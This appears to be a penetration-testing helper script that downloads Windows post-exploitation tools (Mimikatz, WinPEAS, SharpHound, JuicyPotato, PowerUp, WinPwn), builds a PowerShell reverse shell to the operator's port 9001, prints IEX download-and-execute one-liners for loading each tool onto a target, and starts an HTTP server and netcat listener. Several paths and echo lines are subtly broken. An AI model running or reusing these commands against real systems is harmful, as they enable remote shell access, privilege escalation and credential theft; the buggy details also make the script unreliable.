#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                                Windows HTTP Server 
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Download key components...
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

echo "Downloading Procdump..."
wget https://download.sysinternals.com/files/Procdump.zip
unzip Procdump.zip
rm Procdump.zip
mkdir ProcDump
mv ./procdump.exe ./ProcDump/procdump32.exe
mv ./procdump64.exe ./ProcDump/procdump64.exe
rm Eula.txt
echo "Done!"
echo "Downloading WinPeas..."
mkdir WinPeas
cd WinPeas
# wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe
wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe
wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe
mv ./winPEASx86.exe ./winPEAS32.exe
mv ./winPEASx64.exe ./winPEAS64.exe
cd ..
echo "Done!"
echo "Downloading BloodHound..."
mkdir BloodHound
cd BloodHound
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1
mv ./SharpHound.exe ./sharphound.exe
mv ./SharpHound.ps1 ./sharphound.ps1
cd ..
echo "Done!"
echo "Downloading Juicy Potato..."
git clone https://github.com/TsukiCTF/Lovely-Potato.git
cd Lovely-Potato
mv ./Invoke-LovelyPotato.ps1 ./lovelypotato.ps1
mv ./JuicyPotato-Static.exe ./juicypotato.exe
rm README.md
rm test_clsid.bat
cd ..
mv /Lovely-Potato /LovelyPotato
echo "Done!"
mkdir MimiKatz
cd MimiKatz
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
cd ..
echo "Done!"
mkdir PowerShell
cd PowerShell
wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1
wget https://github.com/besimorhino/powercat/raw/master/powercat.ps1
wget https://github.com/HarmJ0y/PowerUp/raw/master/PowerUp.ps1
wget https://github.com/S3cur3Th1sSh1t/WinPwn/raw/master/WinPwn.ps1
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1
wget https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1
mv ./jaws-enum.ps1 ./jawsenu.ps1
mv ./PowerUp.ps1 ./powerup.ps1
mv ./WinPwn.ps1 ./winpwn.ps1
mv ./Out-Minidump.ps1 ./minidump.ps1
mv ./Invoke-Mimikatz.ps1 ./mimikatz.ps1
cd ..
echo "All Done!! - Downloads completed..."
clear

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Display my universal banner.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

clear
echo "\t__        _____ _   _ ____   _____        ______    _   _ _____ _____ ____    ____  _____ ______     _______ ____   "
echo "\t\ \      / /_ _| \ | |  _ \ / _ \ \      / / ___|  | | | |_   _|_   _|  _ \  / ___|| ____|  _ \ \   / / ____|  _ \  "
echo "\t \ \ /\ / / | ||  \| | | | | | | \ \ /\ / /\___ \  | |_| | | |   | | | |_) | \___ \|  _| | |_) \ \ / /|  _| | |_) | "
echo "\t  \ V  V /  | || |\  | |_| | |_| |\ V  V /  ___) | |  _  | | |   | | |  __/   ___) | |___|  _ < \ V / | |___|  _ <  "
echo "\t   \_/\_/  |___|_| \_|____/ \___/  \_/\_/  |____/  |_| |_| |_|   |_| |_|     |____/|_____|_| \_\ \_/  |_____|_| \_\ "
echo "\t                                                                                                                    "
echo "\t                                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                               "
echo "\n"

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Start the HTTP Server.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
cp template.txt reverseshell.ps1

filename="file.txt"
while read line
  do 
  echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 9001" >> reverseshell.ps1
done < $filename

mv ./reverseshell.ps1 ./PowerShell/reverseshell.ps1

echo "Instructions: START PowerShell -ExecutionPolicy Unrestricted -NoProfile\n"

filename="file.txt"
while read line
  do 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/reverseshell.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/jawsenum.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/powerup.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/powercat.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/minidump.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/mimikatz.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/winpwn.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/LovelyPotato/lovelypotato.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/BloodHound/sharphound.ps1')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/BloodHound/sharphound.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/WinPEAS/winPEAS32.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/WinPEAS/winPEAS64.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/ProcDump/procdump32.exe')\""
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/Procdump/procdump64.exe')\"" 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz64.exe')\"" 
  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/MimiKatz/mimikatz32.exe')\"" 
done < $filename

echo ""
exec python -m SimpleHTTPServer > output.txt &
rlwrap nc -lvnp 9001

#EOF
